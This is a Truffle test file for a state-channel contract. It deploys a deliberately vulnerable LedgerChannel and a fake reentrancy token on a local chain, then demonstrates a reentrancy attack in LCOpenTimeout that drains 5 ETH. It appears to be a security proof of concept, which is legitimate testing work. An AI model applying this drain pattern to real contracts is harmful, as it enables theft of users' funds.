"use strict";

const Ledger = artifacts.require("./LedgerChannel.sol");
const Token = artifacts.require("./token/HumanStandardToken.sol");

const Reentrancy = artifacts.require("./token/ReentrancyToken.sol");

const Vulnerable = artifacts.require("./VulnerableLedgerChannel.sol");

const Web3 = require("web3");
const web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:9545")); //ganache port
const BigNumber = web3.BigNumber;

const should = require("chai")
  .use(require("chai-as-promised"))
  .use(require("chai-bignumber")(BigNumber))
  .should();

let SolRevert = txId => {
  return `Transaction: ${txId} exited with an error (status 0).\nPlease check that the transaction:\n    - satisfies all conditions set by Solidity \`require\` statements.\n    - does not trigger a Solidity \`revert\` statement.\n`;
};

contract("LedgerChannel", accounts => {
  let ledger, token, vulnerable;

  before(async () => {
    ledger = await Ledger.deployed();
    token = await Token.deployed();
    vulnerable = await Vulnerable.deployed();
  });

  it.only("should reenter and drain funds in LCOpenTimeout in vulnerable contract", async () => {
    const supply = web3.utils.toBN(web3.utils.toWei("696969", "ether"));

    // create fake token contract
    const reentrancy = await Reentrancy.new(
      supply,
      "Reentrancy Token",
      "18",
      "RET",
      vulnerable.address,
      { from: accounts[9] }
    );

    // fill contract with funds
    await token.approve(vulnerable.address, web3.utils.toWei("5", "ether"), {
      from: accounts[1]
    });
    await vulnerable.createChannel(
      "0x2000000000000000000000000000000000000000000000000000000000000000",
      accounts[0],
      "0",
      token.address,
      [web3.utils.toWei("10", "ether"), "1"], // [eth, token]
      { from: accounts[1], value: web3.utils.toWei("10", "ether") }
    );

    // send fake token contract ETH so it can join a channel
    await web3.eth.sendTransaction({
      value: web3.utils.toWei("5", "ether"),
      to: reentrancy.address,
      from: accounts[6]
    });

    await reentrancy.createChannel({ from: accounts[7] });

    // wait for block timer
    await new Promise(resolve => {
      setTimeout(() => resolve(), 5000);
    });

    const previousBalance = await web3.eth.getBalance(vulnerable.address);
    expect(previousBalance).to.be.equal(web3.utils.toWei("11", "ether"));

    await reentrancy.transfer(accounts[1], 1);

    const afterBalance = await web3.eth.getBalance(vulnerable.address);
    expect(afterBalance).to.be.equal(web3.utils.toWei("6", "ether"));
  });
});
